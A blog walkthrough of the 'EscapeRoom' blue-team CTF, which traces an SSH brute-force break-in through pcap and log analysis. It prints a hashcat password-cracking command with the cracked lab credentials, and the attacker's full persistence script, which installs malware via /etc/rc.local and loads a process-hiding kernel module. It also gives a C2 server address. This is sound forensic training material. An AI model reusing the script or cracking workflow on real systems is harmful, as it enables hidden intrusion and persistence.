---
title: CyberDefenders Writeup EscapeRoom
date: 2022-09-07 16:28:39
tags:
cover: https://cyberdefenders.org/media/terraform/EscapeRoom/escaperoom_fcW8Hvp.png
categories:
- [CyberDefenders]
---

This CTF challenge is made by The Honeynet Project organization. This challenge is a combination of several entry to intermediate-level tasks of increasing difficulty focusing on authentication, information hiding, and cryptography.

# Challenge Information 


+++info Description

You belong to a company specializing in hosting web applications through KVM-based Virtual Machines. Over the weekend, one VM went down, and the site administrators fear this might be the result of malicious activity. They extracted a few logs from the environment in hopes that you might be able to determine what happened.

+++

Challenge Link & Author 

{% links %}
- site: Challenge Link 
  url: https://cyberdefenders.org/blueteam-ctf-challenges/18
  desc: CyberDefenders - EscapeRoom 
  image: https://cyberdefenders.org/static/img/cyberdefenders-logo-white.png
  color: "#2296fd"
- site: Author - The Honeynet Project
  desc: The Honeynet Project Twitter Profile
  url: https://twitter.com/ProjectHoneynet
  image: https://pbs.twimg.com/profile_images/582417177254334464/BNceiZYA_400x400.png
  color: "#fcc11c"

{% endlinks %}

# Walkthrough

We start analyzing the pcap file, i open it with Brim Security and checking the alerts!! Oh god! A lot of ssh flows! mmm I guess the attacker try to gain access through the ssh service, he did a bruteforce attack ! 
![](https://imgur.com/cXk82fL.png)

> 1- What service did the attacker use to gain access to the system?

The attacker use ssh protocol to gain access to the system ! 

:::success
Answer: ssh
:::

> 2- What attack type was used to gain access to the system?(one word)

We found a lot of ssh packets! I am sure this is a bruteforce attack 

:::success
Answer: bruteforce
:::


> 3- What was the tool the attacker possibly used to perform this attack?

One of the most famous tools that can do this type of attack is hydra
Hydra is an amazing tool for testing the strength of your SSH security. It is capable of running through massive lists of usernames, passwords, and targets to test if you or a user is using a potentially vulnerable password.

:::success
Answer: Hydra
:::

> 4- How many failed attempts were there?

Let's inspect the alert events in Brim Security and apply the count() by feature in the `alert.signature`. We found 53 `NetSSH Hardcoded in Metasploit`. We decrease by 1 the success one!
![](https://imgur.com/DpgkZjt.png)

:::success
Answer: 52
:::

We have the hashes of the passwords! We know that the hashes are SHA-512(UNIX). The black cat (oh means hashcat) will help us cracking these hashes!
ٍ![](https://imgur.com/DN0qNUF.png)

```bash command line prompt
hashcat -a 0 -m 1800 shadow.log rockyou.txt

Session..........: hashcat
Status...........: Running
Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
Hash.Target......: crack.txt
Time.Started.....: Wed Sep  7 23:58:23 2022 (43 mins, 15 secs)
Time.Estimated...: Fri Sep  9 04:15:48 2022 (1 day, 3 hours)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/mnt/c/Users/Mohamed Rafraf/Desktop/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.1.........:      986 H/s (5.30ms) @ Accel:32 Loops:1024 Thr:1 Vec:4
Recovered........: 3/10 (30.00%) Digests, 3/10 (30.00%) Salts
Progress.........: 3579360/143443840 (2.50%)
Rejected.........: 0/3579360 (0.00%)
Restore.Point....: 357920/14344384 (2.50%)
Restore.Sub.1...: Salt:5 Amplifier:0-1 Iteration:4096-5000
Candidate.Engine.: Device Generator
Candidates.1....: donjoe -> dominique12

[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit =>

```


> 5- What credentials (username:password) were used to gain access? Refer to shadow.log and sudoers.log.

Just wait for hashcat man!

:::success
manager:forgot
:::

> 6- What other credentials (username:password) could have been used to gain access also have SUDO privileges? Refer to shadow.log and sudoers.log.

Hashcat will save you for sure ! 

:::success
sean:spectre
:::

> 7- What is the tool used to download malicious files on the system?

Let's check the `user-agent` in brim security. you can do it with wireshark too!
![](https://imgur.com/P9haLBY.png)

:::success
Answer: wget
:::

> 8- How many files the attacker download to perform malware installation?

Checking the non-media files in brim security will help us to know about the files

![](https://imgur.com/P6St7uU.png)

:::success
Answer: 3
:::

> 9- What is the main malware MD5 hash?

The malware is an executable file for sure! let's check it 

![](https://imgur.com/VN12PmD.png)

Open the details about it and you'll get the md5sum ! 

![](https://imgur.com/YgnR9gz.png)

:::success
Answer: 772b620736b760c1d736b1e6ba2f885b
:::

We found this bash script that rename the malware mail and hide it in /var/mail/ directory and make it executable at the startup!

```bash command line prompt 
#!/bin/bash

mv 1 /var/mail/mail
chmod +x /var/mail/mail
echo -e "/var/mail/mail &\nsleep 1\npidof mail > /proc/dmesg\nexit 0" > /etc/rc.local
nohup /var/mail/mail > /dev/null 2>&1&
mv 2 /lib/modules/`uname -r`/sysmod.ko
depmod -a
echo "sysmod" >> /etc/modules
modprobe sysmod
sleep 1
pidof mail > /proc/dmesg
rm 3
```

> 10- What file has the script modified so the malware will start upon reboot?

The script /etc/rc.local is for use by the system administrator. It is traditionally executed after all the normal system services are started

:::success
Answer: /etc/rc.local
:::


> 11- Where did the malware keep local files?
:::success
 /var/mail/
:::

> 12- What is missing from ps.log?

In the ps.log we don't find the process related to the malware (the mail executable)

:::success
 /var/mail/mail
:::

> 13- What is the main file that used to remove this information from ps.log?

There is another binary that moved and renamed as `sysmod.ko`

:::success
Answer: sysmod.ko
:::

> 14- Inside the Main function, what is the function that causes requests to those servers?

After unpacking the malware. I opened the binary with IDA Pro to decompile it. Check the main function and we found this ! 

![](https://imgur.com/79houmJ.png)
:::success
Answer: requestFile
:::

> 15- One of the IP's the malware contacted starts with 17. Provide the full IP.

requestFile function use address array as parameters. let's check it ! we found all the IP address. COOL ! 

![](https://imgur.com/4NLcX9k.png)

:::success
Answer: 174.129.57.253
:::

> 16- How many files the malware requested from external servers?

This is easy man ! just check the other downloaded files ! 

![](https://imgur.com/hjMszwa.png)

:::success
Answer: 9
:::

> 17- What are the commands that the malware was receiving from attacker servers? Format: comma-separated in alphabetical order

After spending time on thinking and searching. We get the idea ! 
The malware will get message form attacker servers! So let's check some functions call that related to something like messaging ! You'll find these functions in main !

![](https://imgur.com/V4JQttO.png)

The function check if the parameter has these 2 values ! I want to check it 

![](https://imgur.com/KSxTPRa.png)

After using python to convert the numbers to text using long_to_bytes function i found that 2 values are instruction in the assembly , Bingo we get it ! 

![](https://imgur.com/Hz6LsfB.png)

:::success
Answer: nop,run
:::